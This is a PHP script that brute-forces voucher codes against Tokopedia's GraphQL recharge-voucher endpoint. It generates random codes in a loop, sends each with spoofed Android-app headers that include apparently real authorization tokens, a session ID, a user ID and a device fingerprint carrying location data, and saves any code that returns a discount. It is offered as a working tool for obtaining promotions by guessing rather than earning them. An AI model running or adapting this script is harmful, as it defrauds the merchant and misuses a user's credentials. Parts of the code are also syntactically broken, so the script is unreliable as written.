<?php
function gas($voc){
date_default_timezone_set('Asia/Jakarta');
$url="https://gql.tokopedia.com";
echo "[!] Test VOC: {$voc}\n";
$data='[
  {
    "variables": {
      "data": {
        "product_id": 747,
        "price": 40000,
        "code": "'.$voc.'",
        "client_number": "no isi pulsa"
      }
    },
    "operationName": null,
    "md5": "isi md5",
    "query": "query rechargeCheckVoucher($data: RechargeInputVoucher!) {\n    status\n    rechargeCheckVoucher(voucher: $data) {\n        data {\n          success\n          code\n          discount_amount\n          cashback_amount\n          promo_code_id\n          is_coupon\n          message {\n            state\n            color\n            text\n          }\n          title_description\n        }\n        errors{\n          status\n          title\n        }\n    }\n}\n"
  }
]';
$h=array();
$h[]='{"content-type: application/json"}';
$h[]="x-tkpd-clc: tokopointsCouponList-2273d83912cd2e44a24cdbaca7490497,";
$h[]="x-method: POST";
$h[]="user-agent: TkpdConsumer/3.99 (Android 7.1.2;)";
$h[]="x-user-id: 112476711";
$h[]="request-method: POST";
$h[]="authorization: TKPDROID AndroidApps:V7TxUH/kVPxMY0vTUl7K0iEkFK8=";
$h[]="x-tkpd-app-version: android-3.99";
$h[]="x-tkpd-app-name: com.tokopedia.customerappp";
$h[]="date: Fri, ".date('d')." Nov 2020 ".date('h:i:s')." +0700";
$h[]="os_version: 25";
$h[]="content-md5: c8459e7085dc19455577ca64befaac3f";
$h[]="x-release-track: production";
$h[]="x-app-version: 320309904";
$h[]="x-device: android-3.99";
$h[]="tkpd-sessionid: cZTL2sLN6fA:APA91bG_op068r2N_M8JkuSjEMUiCtMNB9cFs8RkWHaDZkeJQh2G5c34lvptonoRpVVDFY6GBZj16bN4QjAykd623jagpEbi0IdV7u6H7rC-hxNUbpv4SjhXUYxe-w4fBcpJN31h0Ftc";
$h[]="tkpd-userid: 112476711";
$h[]="fingerprint-hash: f6a2a6f614c693440c9497a777874aea";
$h[]="accounts-authorization: Bearer jcCdPW9KNkN7F0n1lm2gqxqyhI2aOMtJdODpz0AXhifLBCkGCGYBU7V24FWit70m4/i3S7eMYwACY8tPgBnWYw==";
$h[]="fingerprint-data: eyJhbmRyb2lkSWQiOiJhMDM0MDFlNGZjZmE4OTIwIiwiYXZhaWxhYmxlUHJvY2Vzc29yIjoiNCIsImNhcnJpZXIiOiJJbmRvc2F0IE9vcmVkb28iLCJjdXJyZW50X29zIjoiNy4xLjIiLCJkZXZpY2VEcGkiOiIyLjAiLCJkZXZpY2VNZW1vcnlDbGFzc0NhcGFjaXR5IjoiMTkyIiwiZGV2aWNlX21hbnVmYWN0dXJlciI6IlhpYW9taSIsImRldmljZV9tb2RlbCI6IlJlZG1pIDRBIiwiZGV2aWNlX25hbWUiOiJSZWRtaSA0QSIsImRldmljZV9zeXN0ZW0iOiJhbmRyb2lkIiwiaXNfZW11bGF0b3IiOmZhbHNlLCJpc19qYWlsYnJva2VuX3Jvb3RlZCI6dHJ1ZSwiaXNfbmFrYW1hIjoiRmFsc2UiLCJpc190YWJsZXQiOmZhbHNlLCJpc3g4NiI6ZmFsc2UsImxhbmd1YWdlIjoiaW5fSUQiLCJsb2NhdGlvbl9sYXRpdHVkZSI6Ii02LjE3NTc5NCIsImxvY2F0aW9uX2xvbmdpdHVkZSI6IjEwNi44MjY0NTciLCJwYWNrYWdlTmFtZSI6ImNvbS50b2tvcGVkaWEudGtwZCIsInBpZCI6IiIsInNjcmVlbl9yZXNvbHV0aW9uIjoiNzIwLDEyODAiLCJzc2lkIjoiIiwidGltZXpvbmUiOiJHTVQrNyIsInVuaXF1ZV9pZCI6IjFkMDJkNWMzLTg2YTItNDRlZi1hNTYyLTQwZmIxZjVlNjZmZCIsInVzZXJfYWdlbnQiOiJEYWx2aWsvMi4xLjAgKExpbnV4OyBVOyBBbmRyb2lkIDcuMS4yOyBSZWRtaSA0QSBNSVVJL1Y5LjIuNi4wLk5DQ01JRUspIn0=";
$h[]="x-ga-id: 1d02d5c3-86a2-44ef-a562-40fb1f5e66fd";
$h[]="content-type: application/json; charset=UTF-8";
$h[]="content-length: ".strlen($data);
$ch=curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_HTTPHEADER,$h);
curl_setopt($ch,CURLOPT_POST,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$data);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_ENCODING,"gzip");
$res=json_decode(curl_exec($ch),true);
curl_close($ch);
$dat=$res[0]['data']['rechargeCheckVoucher']['data'];
$status=(int) $dat['success'];
$diskon=$dat['discount_amount'];
$pesan=$dat['message']['text'];
echo "[•] Voc: {$voc}\n[•] Aqua600ml: {$status}\n[•] Aqua1200ml: {$diskon}\n[•] NOT SURRENDER TEAM: {$pesan}\n";
if($diskon !=0 || $status==1){
$save=fopen('voc.txt','a');
fwrite($save,$voc."\n");
fclose($save);
}
}
error_reporting(0);
require_once 'voc.php';
$i=0;
while($i < 20){
$voc="".coupon::generate(9, ””, ””, true, true);
gas($voc);
sleep(1);
$i++;
}